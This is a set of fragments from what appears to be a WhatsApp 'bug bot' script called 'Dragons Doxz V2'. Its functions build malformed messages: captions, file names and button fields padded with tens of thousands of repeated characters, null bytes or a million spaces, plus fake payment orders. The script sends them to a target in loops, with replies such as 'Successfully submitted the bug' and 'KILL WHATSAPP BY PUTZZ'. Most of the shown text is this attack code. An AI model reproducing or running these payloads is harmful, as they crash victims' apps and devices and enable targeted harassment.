...
let { key } = await rxhl.sendMessage(from, {text: '𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀....'})
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
        ...
        'message': {
          ...
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            ...
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀\".repeat(50000),\"url\":\"https://wa.me/6283874475834\",\"merchant_url\":\"https://www.google.com\"}"
              }],
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/53acae4970c088a84939e.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀', url : , merchant_url :  }"
            }],
                        ...
                        nativeFlowMessage: {
                            buttons: [
                                ...
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 💀`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214`}}}, { quoted:m})} 
...
title: `© AlwaysPutzz - BDS`,
body: `Halo ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: rxhlimage,
sourceUrl: `https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214`,
mediaUrl: `https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214`
}
},
text: teks
}, {
...
"newsletterName": '𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫',
"serverMessageId": 1
},
},
"header": {
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214\",\"merchant_url\":\"https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214\"}"
}
],
"messageParamsJson": ""
}
...
mediaType:  1,
mediaUrl: 'https://wa.me/6283874475834',
title: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
sourceUrl: `https://wa.me/6283874475834`, 
thumbnail: rxhlimage
}
}})
break
...
Creator: AlwaysPutzz - BDS
Telegram: t.me/AlwaysPutzz
Base: 𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀
Versi Bot: V2
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DEVELOPED BY PUTZZ OFFICIAL*`
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363316265977402@newsletter', newsletterName: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {document: slayer07, caption: `𝐃𝐫𝐚𝐠𝐨𝐧𝐬 𝐃𝐨𝐱𝐳 𝐕𝟐 💀` },{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break
...
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029VajoTz0Id7nPYawsH214`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY PUTZZ`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
